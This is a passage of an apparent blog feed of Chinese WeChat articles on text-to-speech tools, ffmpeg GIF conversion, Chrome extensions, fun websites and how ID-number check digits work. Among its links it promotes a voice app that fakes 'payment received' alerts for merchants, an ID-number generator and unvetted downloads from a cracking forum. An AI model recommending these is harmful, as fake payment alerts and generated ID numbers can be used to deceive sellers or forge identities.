转换https://www.zaixianai.cn/voiceCompose朗读女是一款调用系统的 TTS 语音引擎或在线云语音引擎来朗读文本的语音工具。视频教程：http://www.443w.com/tts/?post=44朗读女 官方下载地址:http://www.443w.com/xz/tts.zip装X语音播报 非常潇洒的一款软件，模拟支付商家收款、支付到账、语音播报，输入金额，点击播报，温馨提示：请到群集区，音量开最大~https://www.lanzous.com/i4ozled一个可以识别视频语音自动生成字幕 SRT 文件的开源 Windows 软件，快速做字幕文字转语音助手文字转语音工具 Balabolka工具http://balabolka.site/cn/balabolka.htm录音转文字https://www.luyinla.com/https://www.lanzous.com/i38lbgjhttps://pan.baidu.com/s/1bTGKtXLKsJi28xFjEmicXQ 密码：rqv4突破知乎的复制功能 https://www.zhihu.com/question/58816461/answer/159061846万能君的小工具 下载链接：https://pan.baidu.com/s/1eHuCzBAKtvvSTkHatWzRZA 提取码：usexhttps://www.52pojie.cn/thread-981080-1-1.html语音转文字网页：https://www.iflyrec.com/文字转语音 / 语音转文字 https://zhuanlan.zhihu.com/p/75819181 https://ttsreader.com/zh/文字语音工具 https://www.zhihu.com/question/24090079装逼必备神器，虚拟语音到账提醒！吸引大家的目光 https://ssrshare.github.io/2019/06/24/zhuangbi/讯飞在线文字转语音 https://www.52pojie.cn/thread-738821-1-1.html https://www.lanzous.com/i2u0azc朗读女http://www.443w.com/tts/ https://www.52pojie.cn/thread-870964-1-1.html https://www.lanzous.com/i366ygfbalabolka https://pan.baidu.com/s/1XaQLnDEY7UjnVavNlbnKuQ文字转语音全能王 https://www.52pojie.cn/thread-1047134-1-1.html 官方下载地址：http://alt.iarts-cn.com/product/ttsking980-8151.zip讯飞配音合成真人文字转语音工具https://www.52pojie.cn/thread-851216-1-1.htmlMP3 转换 剪辑 合成工具 https://www.lanzous.com/i2ojnad讯飞配音文字转语音 链接: https://pan.baidu.com/s/1ymxMWPnvf7d4mfl2284MOg 提取码: yicy朗读女http://www.443w.com/xz/tts.zipBalabolka http://balabolka.site/cn/balabolka.htm 链接: https://pan.baidu.com/s/1P1vnj-RJURQv5SUaxXf4FQ 提取码: 9xfi讯飞 链接: https://pan.baidu.com/s/1DGTDNhU1JMjFCtcqk-MKIg 提取码: am2t]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何将视频轻松转换为 GIF]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%A6%82%E4%BD%95%E5%B0%86%E8%A7%86%E9%A2%91%E8%BD%BB%E6%9D%BE%E8%BD%AC%E6%8D%A2%E4%B8%BA-GIF%2F</url>
    <content type="text"><![CDATA[苏生不惑第 101 篇原创文章 有时看到一条有意思的视频想发到朋友圈，但朋友圈有限制时长，而且也不方便，这时可以把视频转GIF（再做成表情包也可以），再发到朋友圈或者微博（不用像视频一样需要等待审核）。 以这条《武林外传之中秋节》2分多钟的微博视频为例 https://weibo.com/tv/v/4287748958527478?fid=1034:4287748958527478 先把微博视频下载到本地，可以参考之前的文章那些你可能不知道的视频下载奇技淫巧 ffmpegffmpeg 是一个自由软件，可以运行音频和视频多种格式的录影、转换、流功能。https://www.ffmpeg.org/ 转换GIF很简单，命令行执行 ffmpeg -i 武林外传,幻境再美终是梦,珍惜眼前始为真,莫使金樽空对月,举杯幸会有缘人.mp4 武林外传中秋节.gif这个2分多的视频转换的GIF 100多M，太大了！ 这里只截取前5秒ffmpeg -ss 0 -to 5 -i 武林外传,幻境再美终是梦,珍惜眼前始为真,莫使金樽空对月,举杯幸会有缘人.mp4 -s 400*300 -r 15 武林外传中秋节.gif 可以看到转换的GIF 不到2M，这样就可以发在公众号上了。看效果： 可以再转换回视频ffmpeg -f gif -i 武林外传中秋节.gif 武林外传中秋节.mp4 ffmpeg 除了转换视频，还能下载视频网站的m3u8视频，之前写过如何下载优酷 m3u8 格式的视频文件？ffmpeg -i &quot;https://pl-ali.youku.com/playlist/m3u8&quot; -vcodec copy -acodec copy -absf aac_adtstoasc 不能说的秘密.mp4 还能提取视频的音频 ffmpeg -i 武林外传中秋节.mp4 -f mp3 -vn 武林外传中秋节.mp3 ，更多功能参考官网。 ezgifhttps://ezgif.com/video-to-gif 这个网站比较知名，上传视频后可以看到视频信息，File size: 5.64MiB, width: 852px, height: 480px, length: 00:02:20, type: mp4默认是截取前5秒，也可以自定义。 很快就转换完了https://ezgif.com/video-to-gif/ezgif-5-45e0fc4e95f5.mp4，然后另存为GIF。可以看到GIF 5.8M，有点大，这里再裁剪下。裁剪50%后的文件大小1.54M 动次http://dongci.kawo.com 这个网站非常简单，直接上传视频，截取片段，生成GIF。 很快就生成了（默认前10s），有4.5M。你也可以自行选择截取片段。 gifhomehttps://tool.gifhome.com/video/ 这个GIF工具之家有很多GIF工具。默认前5秒转换的GIF有9M多。点击压缩并下载，但还是有7M。 convertiohttps://convertio.co/zh/video-converter/直接转换跟ffmpeg一样，转换的GIF 181M！最好先截取视频再上传转换。 Chrome扩展这是一个Chrome扩展 https://chrome.google.com/webstore/detail/%E8%A7%86%E9%A2%91%E8%BD%ACgif/leddonjpeickjppkdpmojghbikcimbca?hl=zh-CN ， 可以添加文字，制作表情包，支持常见视频格式，本地转换等，关于安装和使用Chrome之前写过很多了 那些实用的 Chrome 扩展神器也取前5秒 已完成、右键存储图片这个截取的GIF 有2.24MB。 QQ 影音https://player.qq.com/ 这是我常用的播放器，腾讯出品。选择5秒。转换后960K，效果不错。 分解GIF转换后的GIF可以再分解成图片 https://tools.miku.ac/gif_splitter/ 这个工具可以将GIF分解为近百个小图片。 最后总结下： ffmpeg 功能多（不限于转GIF），Chrome扩展方便，QQ影音简单好用。 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何备份可能被删的公众号文章和网页]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%A6%82%E4%BD%95%E5%A4%87%E4%BB%BD%E5%8F%AF%E8%83%BD%E8%A2%AB%E5%88%A0%E7%9A%84%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E5%92%8C%E7%BD%91%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[苏生不惑第 100 篇文章 我有个习惯，微信里看到的好文章都喜欢发给自己，然后有空的时候来看，但经常发现几天前的文章要不作者删了，要不被投诉删了。 关于被删的公众号文章之前写过想看的公众号文章被删了怎么办？，不过有个前提，第三方网站收录了这个公众号，如果没有收录，也看不到了。 如何保存这些好文章呢？即使原文被删了，自己还能看，这里推荐几个方法。 这里以我之前的文章身份证号码的秘密 为例。 截图手机都自带截图功能（有些手机还有滚动截屏），手机浏览器也有。 这种截图形式不方便复制文字，而且图片也不方便搜索。 浏览器另存为PDF复制文章链接https://mp.weixin.qq.com/s/yYuS5_2obt50kH4yrLg1Jw，在谷歌浏览器按ctrl+p弹出另存为PDF对话框。 保存后的PDF效果 PDF格式比图片方便，不过PDF格式不方便在手机看。 网页另存为html浏览器按ctrl+s弹出另存为对话框 保存下来的文件 身份证号码的秘密.html用浏览器打开文字能看，但图片没了，因为公众号的图片用的是data-src属性，不是 src。 互联网档案馆关于这个档案馆 https://archive.org/web，之前写过[跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌](https://mp.weixin.qq.com/s/LKDGKWi62J5Zyzh3rB-IiQ)，之前我就保存过一篇文章 ，生成的永久链接 https://web.archive.org/web/20191027081838/https://mp.weixin.qq.com/s/Xz1m-mqtCcBF_4hmGCpkUQ 不过这个网站在墙外。。。 印象笔记收藏微信里自带了我的印象笔记功能。 先关注我的印象笔记公众号然后登录你的印象笔记 再收藏文章会提示你授权。 收到绑定通知关于保存微信文章具体看这里https://list.yinxiang.com/xiaobaixiulian/d4e2d9ff-f1ec-433b-ac25-710db4b2ae66.php，再次收藏文章收到保存成功通知。登录你的印象笔记就能看到微信里收藏的那篇文章了。 可以看到收藏到印象笔记的图片https://app.yinxiang.com/shard/s10/res/2f618af9-e269-40e4-bfb5-539741e48e59/640.jpg 不是微信的，是印象笔记的。 印象笔记除了收藏公众号文章还能收藏微博，先关注微博账号我的印象笔记 https://weibo.com/myyxbj ，收到提示消息，绑定你的印象笔记帐户。 然后微博授权 收到绑定成功微博私信 绑定后只需要在评论微博 https://weibo.com/2717930601/IusNh4Ggx 的时候@我的印象笔记，就可以将这条微博保存到印象笔记了。 登录印象笔记就可以看到这条微博了。 可惜现在不能转发私信收藏微博了。 除了在微信里用印象笔记收藏，它还有个剪藏Chrome扩展 https://chrome.google.com/webstore/detail/evernote-web-clipper/pioclpoplcdbaefihamjohnefbikjilc，这个扩展可以快速保存、标注和分享网上一切内容，包括网页正文、图片、截屏和整个网页，一键保存网页到印象笔记，即时同步到你的手机和电脑 https://www.yinxiang.com/webclipper/ 打开文章 身份证号码的秘密，点击扩展按钮 可以保存网页正文，隐藏广告，屏幕截图等。进入印象笔记看到这篇文章已经保存自己印象笔记了。 简悦这是个Chrome扩展 https://chrome.google.com/webstore/detail/%E7%AE%80%E6%82%A6-simpread/ijllcpnolfcooahcekpamkbidhejabll ，最初用来方便阅读文章的，后来功能越来越全，借鉴下作者的说明。12345678910111213141516171819*** 主要功能一览 ***◼ 阅读模式 简悦独有功能，以下多种功能仅「简悦独享」 ◻ 支持 主动适配模式 · 智能感知 · 手动框选 ◻ 支持【论坛类页面】与【分页功能】如：知乎 · 百度贴吧 等 ◻ 支持【自动生成目录】 ◻ 支持【TXT 阅读器】【Markdown 阅读器】【LaTeX 识别】◼ 聚焦模式 不改变当前页面的结构，仅仅高亮需要阅读的部分◼ 更符合【中文阅读习惯的设置】 字间距 · 行间距 · 字重 · 自定义 CSS◼ 丰富的导出功能 ◻ 导出到本地 👉 Markdown · HTML · PNG · PDF · Epub · Send to Kindle · 离线 HTML · 截图 ◻ 导出到生产力工具 👉 语雀 · 坚果云 · 有道云笔记 · 为知笔记 · Dropbox · Notion · Onenote · Google Drive · 印象笔记 / Evernote · WebDAV ◻ 导出到稍后读 👉 Pocket · Instapaper · Linnk 比如调整字体等样式。这里主要说保存网页到第三方平台，如印象笔记。授权插件访问你的印象笔记然后将文章保存到你的印象笔记。可惜备份的公众号图片挂了，不如印象笔记插件，不过它支持的平台多，比如语雀 · 坚果云 · 有道云笔记 · 为知笔记等。 不过你可以导出为本地markdown文件。 最后总结下，微信公众号文章在微信里保存到我的印象笔记，网页上用印象笔记插件，如果要保存到其他平台用简悦，还有什么更好的备份方式欢迎留言。 福利:到今天公众号居然更新了 100 篇原创了，感谢大家的关注，公众号内回复 支付宝 领取支付宝红包，手慢无。 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些实用的 Chrome 扩展神器（三）]]></title>
    <url>%2F2020%2F04%2F01%2F%E9%82%A3%E4%BA%9B%E5%AE%9E%E7%94%A8%E7%9A%84-Chrome-%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[之前写过那些实用的 Chrome 扩展神器 那些实用的 Chrome 扩展神器（二），这里继续分享实用的Chrome 扩展。 本来安装Chrome扩展很简单 但由于国内没法上谷歌，淘宝就有了对应的下载Chrome服务，帮忙下载个插件收费20，第一次看到的时候我是震惊的 https://item.taobao.com/item.htm?id=544710275193 其实不用花那个钱，在 https://crxdl.com/ 或者 https://chrome-extension-downloader.com/ 这个网站输入插件id直接下载crx文件，然后打开谷歌浏览器 chrome://extensions/ 将下载的crx文件拖进去就好了。 比如下载https://chrome.google.com/webstore/detail/read-aloud-a-text-to-spee/hdhinadidafjejdhmfkjgnolgimiaplp 这个插件 输入插件id hdhinadidafjejdhmfkjgnolgimiaplp 点击下载最新版 微信同步助手 还在为一次编辑，N个平台需多次排版上传脑壳疼吧？有了同步助手就能做到一次排版，多渠道同步发布！ 这个扩展专为微信公众号文章设计，旨在提供一个简便的方式来同步公众号文章到多个平台,支持同步到头条号、简书、知乎、WordPress等平台，不用再一个个平台复制粘贴发布文章了。 比如将这篇文章 身份证号码的秘密同步到知乎，安装这个扩展后左侧有同步该文章按钮。点击同步按钮会弹出要同步的平台（需要先在浏览器里登录，我这里只登录了知乎和简书）。 选择知乎同步一会就同步成功了，图片也会同步上传到知乎。点击查看草稿进入知乎可以看到文字和图片，还有封面都同步了，然后直接在知乎发布了。 除了同步文章还有任意文章正文提取弹窗提取出文章，可以直接编辑，对于某些不让复制的网站（不限制公众号文章）可以直接copy了。 Chrome插件地址https://chrome.google.com/webstore/detail/%E5%BE%AE%E4%BF%A1%E5%90%8C%E6%AD%A5%E5%8A%A9%E6%89%8B/hchobocdmclopcbnibdnoafilagadion 监控网页 监控网页或源以获取变更。在侦测到变更时接收短信或电子邮件通知。特色亮点：从任何网页方便地选择内容。突出显示变更。 变更历史。支持的操作： - 电子邮件 - 短信 - 声音 - 弹窗 - 向手机推送通知 - Webhook Distill 在浏览器上运行，检查监控的页面有无变更，在侦测到变更时立即发出通知。 https://distill.io/kb/help/distill-chrome-extension/?utm_source=install比如这个知乎问题 https://www.zhihu.com/question/25699277，有新的回答及时通知我。 点击监控整个页面。设置一分钟监控一次一会就收到通知了。 Chrome扩展地址 https://chrome.google.com/webstore/detail/distill-web-monitor/inlikjemeeknofckkjolnjbpehgadgge 印象笔记·剪藏这个扩展可以快速保存、标注和分享网上一切内容，包括网页正文、图片、截屏和整个网页，一键保存网页到印象笔记，即时同步到你的手机和电脑，不用复制粘贴编辑再整理，防止404下次看不到了 https://www.yinxiang.com/webclipper/ 打开文章 身份证号码的秘密，点击扩展按钮 可以保存网页正文，隐藏广告，屏幕截图等。进入印象笔记看到这篇文章已经保存自己印象笔记了。 Chrome扩展地址 https://chrome.google.com/webstore/detail/evernote-web-clipper/pioclpoplcdbaefihamjohnefbikjilc CPU/内存使用率监控器在浏览器扩展图标上显示系统 CPU 或内存的使用率。点击扩展图标可以设置显示形式，如图形或数字，鼠标悬浮在扩展图标上会显示详细信息。 Chrome扩展地址： https://chrome.google.com/webstore/detail/fcofohckagnahikfankmacbepefilmof 中文在线转换这个扩展支持拼音、简体繁体、广东话或粤语和普通话https://justyy.com/tools/chinese-converter/还有拼音再普通话转粤语将文章简体字转为繁体字效果 对于繁体字网页选择中文简体就好，再转为拼音。 Chrome扩展地址 https://chrome.google.com/webstore/detail/%E7%AE%80%E4%BD%93%E7%B9%81%E4%BD%93%E6%8B%BC%E9%9F%B3%E5%B9%BF%E4%B8%9C%E8%AF%9D%E8%BD%AC%E6%8D%A2-simplifiedtra/olpihmabpjpllgmahlgiakkgaccigpfo 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 春节假期在家无聊？来这里看看 用知识抗击疫情，机械工业/电子工业/清华大学等出版社免费开放电子书阅读 来看看你所在小区附近是否有新型肺炎疫情 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有意思的网站（二）]]></title>
    <url>%2F2020%2F04%2F01%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第 98 篇原创文章 之前写过 那些有意思的网站 和 那些有趣的网站 ，这里继续分享那些有意思的网站。 苹果档案这是一个苹果公司档案网站（非官方），收集了苹果公司从成立以来的所有广告、海报和宣传材料 https://www.applearchive.org/比如1988年的档案https://www.applearchive.org/1988类似的有 Flash 动画存档 http://flasharchive.azurewebsites.net/，比如迈克尔杰克逊舞王 http://flasharchive.azurewebsites.net/static/player.html?category=action&amp;filename=maikeerjiekexunwuwang-191.swf 豆瓣帖子时光机这个网站每 15 到60 分钟抓取一次所有帖子，自动保存在互联网档案馆，可以列表浏览所有（包括被删除的）帖子。https://archive.bbs.io/比如武汉豆瓣的帖子列表https://archive.bbs.io/list.php?table=wuhan 关于互联网档案馆https://archive.org ，可以看看之前写的跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌 给小孩取名这次疫情很多人只能待在家里，年底可能要爆发一波婴儿潮，先准备下孩子的名字吧，搜狗输入法出品http://pinyin.sogou.com/youmingtang/输入苏，共82个名字，应该有不少好名字。 动态排序图表一个无需代码，一键生成，小白也可以使用的动态排序图表 先上传数据，再修改图表的颜色、尺寸、标题、数据来源、logo等，然后直接发布生成一个网站https://app.flourish.studio/@flourish/bar-chart-race ，再分享出去。data列表修改China为中国预览效果可以导出图片和HTML（需要高级权限）。 卡通头像生成无限多的卡通头像，总能找到一款适合你的 https://getavatars.app/往下拉可以一直生成，想换头像的挑一个吧。 恐龙小游戏Chrome浏览器在断网时会出现恐龙小游戏当然不断网输入chrome://dino/也可以玩，如果在手机上可以用这个 https://ishare20.net/game/chromedino/ ，想玩高分，F12打开控制台执行以下代码123var dino=Runner.prototypedino.gameOver=()=&gt;&#123;&#125;Runner.instance_.setSpeed(233) 后续新闻有些新闻可能大热了一时，然后就被大众遗忘了，这个网站会持续追踪热点新闻 https://houxu.app/ ，他们还有对应的APP https://play.google.com/store/apps/details?id=app.houxu.android 比如各地新型冠状肺炎病毒病例https://houxu.app/lives/32158， 根据时间倒序记录，希望这次疫情快点过去。 如果你想追每日的热点新闻，看看上班摸鱼好去处 基于浏览器的 P2P 传文件代替百度网盘传文件，帮电脑和手机搭建直连通道，只需一个浏览器，方便的传送大文件，首先打开网站会生成一个唯一链接，比如https://www.pplink.link/?r=5aeae140-18f8-11ea-aeac-f7e3a928d047 把这个地址发给他人 ，对方打开这个链接就可以和你在线聊天和传文件了。 数学公式转化还在苦恼复杂的数学公式和化学方程式没办法用电脑打出来？这个网站让你轻松地以手绘的方式画出来，然后交给电脑自动帮你转化。 https://webdemo.myscript.com/views/math/index.html 然后在http://asciimath.org/ 这里转化下就能输出公式了。 学习做任何事我们希望帮助这个星球上的所有人学习做任何事情，这个网站简直生活百科 https://zh.wikihow.com/%E9%A6%96%E9%A1%B5 ，可以告诉你如何保暖，如何表现自己，如何网上赚钱等等。今天就是情人节了，如果有人向你告白除了说一句他是个好人还有什么更好的方式呢 https://zh.wikihow.com/%E5%91%8A%E8%AF%89%E4%B8%80%E4%BD%8D%E7%94%B7%E6%80%A7%E4%BD%A0%E4%B8%8D%E5%96%9C%E6%AC%A2%E4%BB%96 深度学习对对联最近日本捐赠的物资上题诗 青山一道同云雨，明月何曾是两乡，怎么回应好呢？ 来https://ai.binwang.me/couplet/ 出个下联 碧海两岸共婵娟，长天依旧属谪仙。再加个横批 http://duilian.msra.cn/app/couplet.aspx 教你折纸飞机 各式各样的纸飞机 https://www.foldnfly.com/index.html简单几步学会折飞机，在家跟孩子一起玩这个吧。 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 春节假期在家无聊？来这里看看 身份证号码的秘密 来看看你所在小区附近是否有新型肺炎疫情 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[身份证号码的秘密]]></title>
    <url>%2F2020%2F03%2F30%2F%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E7%9A%84%E7%A7%98%E5%AF%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第 97 篇原创文章 身份证应该是我们最常使用的物品了，有没有想过18位的身份证号码怎么生成的，每个数字又有什么意义呢？ 从中华人民共和国建国起到1984年，中华人民共和国公民并没有身份证件，证明身份需用户口簿、介绍信等。1984年4月6日，中华人民共和国国务院发布《中华人民共和国居民身份证试行条例》，公安部的工作人员开始进行有关技术和具体实施方法的研究，在自行研制并且借鉴外国之后，第一代居民身份证的形式被确定为聚酯膜塑封的单页卡片。1984年至1991年，北京、上海、天津等大城市开始进行试行身份证制度。生活在北京的中国歌剧舞剧院女高音歌唱演员单秀荣成为中华人民共和国第一个领到第一代身份证的中国居民 以上来自维基百科 https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%B1%85%E6%B0%91%E8%BA%AB%E4%BB%BD%E8%AF%81 需要注意的是印有国徽和有效期限的这一面才是正面！ 身份证号码组成身份号码由17位数字本体码和1位校验码组成，校验码的作用是为了防止在填写身份证号码时出错而设计的。 前6位为所在地区（市、镇、区）的行政区划代码，接着后面8位是年月日生日 ，顺序码 3位，防止同一个地方同一天出生的人重号，第17位奇数代表男偶数代表女。校验码1位（0-9和 x），用来校验身份证号码正确，通过前17位计算模11得出来的，就是0-10 这11个数字,其中10用x表示。 用一张图片看清晰点。 身份证校验码计算方法如下： 将身份证号码前17位数分别乘以不同的系数，从第一位到第十七位的系数分别为：7－9－10－5－8－4－2－1－6－3－7－9－10－5－8－4－2。将这17位数字和系数相乘的结果相加。用加出来和除以11，取余数。余数只可能有0－1－2－3－4－5－6－7－8－9－10这11个数字。其分别对应的最后一位身份证的号码为1－0－X －9－8－7－6－5－4－3－2。如果余数是2，身份证的最后一位号码就是罗马数字x。如果余数是10， 最后一位就是2。 推荐看看李永乐老师的视频 史上最靓身份证号220202202002020022即将诞生！ https://www.bilibili.com/video/av86690236 220202202002020022 前17位根据上面算法加起来为98，对11取余为10，对应末尾数字就是2，所以这个号码是正确的。 2月2号吉林昌邑区第一个出生的女孩到派出所注册，这个自带靓号的身份证就是她的了,百年不遇的一个号码！如果错过了220202202002020022这个靓号，没关系，还有下面这些：12345678220220202002200202220220202002222022220222202002200002220222202002220222222202202002022222222202202002220202222222202002020222222222202002202202 还有回形针也出过对应的视频 如何成为一个有身份的人https://www.bilibili.com/video/av79769795 类似220202202002020022这样的号码如何检验是否正确呢？ 校验身份证号http://www.ip33.com/shenfenzheng.html 输入220202202002020022验证正确。220202202002020021验证错误。 用Python代码可以使用id-validator1234567 pip install id-validatorfrom id_validator import validatorvalidator.is_valid('440308199901101512') # 大陆居民身份证 18 位validator.is_valid('610104620927690') # 大陆居民身份证 15 位validator.is_valid('810000199408230021') # 港澳居民居住证 18 位validator.is_valid('830000199201300022') # 台湾居民居住证 18 位 基于上面的生成算法还有相应的生成器 身份证号码生成器比如生成一个北京西城区的号码 http://www.welefen.com/lab/identify/?province=%E5%8C%97%E4%BA%AC&amp;city=%E5%B8%82%E8%BE%96%E5%8C%BA&amp;area=%E8%A5%BF%E5%9F%8E%E5%8C%BA&amp;year=2002&amp;month=1&amp;day=1&amp;sex=%E7%94%B7 一个身份证只能绑定5个实名微信，没有绑定实名信息的微信发不了红包，转不了账，如何查询自己的身份证绑定过多少微信号？ 腾讯客服在公众号 腾讯客服 中输入名下账户 然后输入 身份证实名了哪些微信 会自动回复“点这里”，点进去之后输入姓名，身份证号，实名认证后，就会有你身份证名下所有的微信号，如果发现有不是自己的微信号，直接清除。 平时出门在外忘带身份证怎么办呢？ 国门公安APP国门公安APP 可在线办临时身份证 如果需要复印自己身份证给他人，可以加上水印。 身份证加水印这个是纯前端图片加水印，不用担心上传你的个人信息 http://watermark.dxcweb.com/ 身份证冷知识1984年,国务院发布《中华人民共和国居民身份证试行条例》,开始实行居民身份证制度。身份证号码那么多位，每一位代表什么？为什么有人身份证的末尾是X？身份证丢失怎么补办？身份证复印件怎么签注才能保证安全？最后推荐下国家政务服务平台 国家政务服务平台国家政务服务平台已上线试运行，统一身份认证、统一证照服务、统一事项服务、统一政务服务投诉建议、统一好差评、统一用户服务，统一搜索服务，打开http://gjzwfw.www.gov.cn/index.html 体验 或者到应用市场搜索“国家政务服务平台”下载APP。 绑定身份证信息并进行刷脸认证后，可以查询自己的电子社保卡 、部分地区的证照信息（如居民户口簿、机动车行驶证）、部分银行的银行卡信息 、部分保险公司的保险信息 、出入境记录、公积金记录等。 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 春节假期在家无聊？来这里看看 用知识抗击疫情，机械工业/电子工业/清华大学等出版社免费开放电子书阅读 来看看你所在小区附近是否有新型肺炎疫情 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[来看看你所在小区附近是否有新型肺炎疫情]]></title>
    <url>%2F2020%2F03%2F30%2F%E6%9D%A5%E7%9C%8B%E7%9C%8B%E4%BD%A0%E6%89%80%E5%9C%A8%E5%B0%8F%E5%8C%BA%E9%99%84%E8%BF%91%E6%98%AF%E5%90%A6%E6%9C%89%E6%96%B0%E5%9E%8B%E8%82%BA%E7%82%8E%E7%96%AB%E6%83%85%2F</url>
    <content type="text"><![CDATA[苏生不惑第 96 篇原创文章 今天的确诊数据还在上升，下图来自新浪新闻 https://news.sina.cn/zt_d/yiqing0121 疫情动态提醒如果想及时知道疫情最新动态可以在公众号 丁香医生+ 设置微信提醒。 同行查询工具除了疫情地图还有新型肺炎确诊病患同行查询工具https://news.sina.cn/project/fy2020/fysearch.shtml ，飞机火车都可以查询。 小区疫情新浪新闻还联合小雨伞合作开发了 小区疫情 功能，可以查看你小区附近是否有疫情 https://www.xiaoyusan.com/static/page/name/staticact/sina比如深圳的这些小区 同时腾讯看点也出了个新型肺炎小区查询 ，选择对应的城市查，可惜不能搜索。https://ncov.html5.qq.com/community?channelid=17&amp;from=timeline后续出的疫情地图更直观点 https://houxu.app/nconv/map 城市疫情场所地图这个数据来自各城市卫健委网站、公众号等官方渠道，支持搜索https://mapmiao.com/ncov/?from=timeline&amp;isappinstalled=0&amp;city=%E5%8C%97%E4%BA%AC%E5%B8%82选择北京搜索回龙观没有结果。搜索北苑有北京和广州的小区。 广东确诊病例轨迹查询这个只有广东的数据 https://m.mp.oeeee.com/h5/pages/v20/nCovcase/?from=timeline#/ 比如深圳南山区湖北疫情动态图 https://dydata.io/show/f80e8e99ce0b1ca6edc9ddbd66e42a97北京大学 新型冠状病毒感染肺炎疫情 可视分析系列 http://vis.pku.edu.cn/ncov/home.html 防护措施宅线，上班线，返程线，就医线，来自央视新闻的新型冠状病毒感染防护措施线路图 https://weibo.com/1225314032/Issyhvwv7 大家做好自我防护，戴口罩，勤洗手，再坚持一段时间，相信疫情会过去的。 另外百度网盘推出一个活动 今天起给湖北地区所有亲戚免费放送超级会员，时间截止到2月12，湖北的小伙伴去百度网盘APP领取吧。 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 春节假期在家无聊？来这里看看 用知识抗击疫情，机械工业/电子工业/清华大学等出版社免费开放电子书阅读 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用知识抗击疫情，机械工业/电子工业/清华大学等出版社免费开放电子书阅读]]></title>
    <url>%2F2020%2F03%2F30%2F%E7%94%A8%E7%9F%A5%E8%AF%86%E6%8A%97%E5%87%BB%E7%96%AB%E6%83%85%EF%BC%8C%E6%9C%BA%E6%A2%B0%E5%B7%A5%E4%B8%9A-%E7%94%B5%E5%AD%90%E5%B7%A5%E4%B8%9A-%E6%B8%85%E5%8D%8E%E5%A4%A7%E5%AD%A6%E7%AD%89%E5%87%BA%E7%89%88%E7%A4%BE%E5%85%8D%E8%B4%B9%E5%BC%80%E6%94%BE%E7%94%B5%E5%AD%90%E4%B9%A6%E9%98%85%E8%AF%BB%2F</url>
